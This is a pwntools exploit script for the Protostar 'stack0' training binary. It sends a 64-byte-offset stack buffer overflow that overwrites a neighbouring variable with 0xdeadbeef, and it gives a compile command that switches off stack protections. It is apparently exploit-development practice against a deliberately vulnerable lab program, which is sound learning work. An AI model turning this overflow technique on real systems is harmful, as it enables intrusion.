from pwn import *
import os

# --- Configuration ---
exe_path = 'vulnerable-programs/protostar-stack0/stack0' 

if not os.path.exists(exe_path):
    log.error(f"Binary not found at {exe_path}. Did you compile it?\nRun: gcc stack0.c -o stack0 -fno-stack-protector -z execstack -no-pie")

elf = ELF(exe_path, checksec=False) 
context.binary = elf
context.log_level = 'debug'

# If gdb.attach fails to open a window, uncomment and adjust this for your terminal:
# context.terminal = ['gnome-terminal', '-e']  # For GNOME (Kali Default)
# context.terminal = ['tmux', 'splitw', '-h']  # For tmux

LOCAL = True 

def start():
    if LOCAL:
        return process([exe_path])
    else:
        return remote(HOST, PORT)

# --- Exploit Logic ---

offset = 64 
value_to_overwrite = 0xdeadbeef 

payload = flat({
    offset: value_to_overwrite
})

io = start()

# --- VERIFICATION: GDB DEBUGGING ---
# To see the memory rewrite happen in real-time:
# 1. Uncomment the gdb.attach block below.
# 2. Run the script. A GDB window will open.
# 3. The script sends the payload.
# 4. In the GDB window, use 'x/40wx $rsp' (or $esp) to see the stack memory.
#    You should see rows of 0x41414141 followed by 0xdeadbeef.

# gdb.attach(io, gdbscript='''
#     # Set a breakpoint at main so we catch it early
#     b *main
#     continue
# ''')

# CRITICAL FIX: Send payload blindly to bypass buffering issues
# io.recvuntil(b'input: ') 

log.info(f"Sending payload...")
io.sendline(payload)

# Receive output
output = io.recvall().decode()
print("--- Output ---")
print(output)

if "changed" in output:
    log.success("Exploit worked! Variable modified.")
else:
    log.failure("Exploit failed. Variable was not modified.")